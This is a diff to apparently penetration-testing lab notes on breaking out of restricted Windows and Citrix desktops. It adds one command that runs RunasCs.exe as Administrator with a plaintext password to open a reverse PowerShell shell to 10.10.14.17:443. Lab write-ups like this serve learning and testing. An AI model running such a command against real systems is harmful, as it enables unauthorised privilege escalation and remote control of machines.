@@ -202,3 +202,8 @@ Note: Wait for 5 minutes after spawning the target. Disregard the licensing mess
 
 - [Breaking out of Citrix and other Restricted Desktop environments](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/)
 - [Breaking out of Windows Environments](https://node-security.com/posts/breaking-out-of-windows-environments/)
+
+
+```c
+.\RunasCs.exe Administrator Th1s889Rabb!t powershell.exe -r 10.10.14.17:443
+```
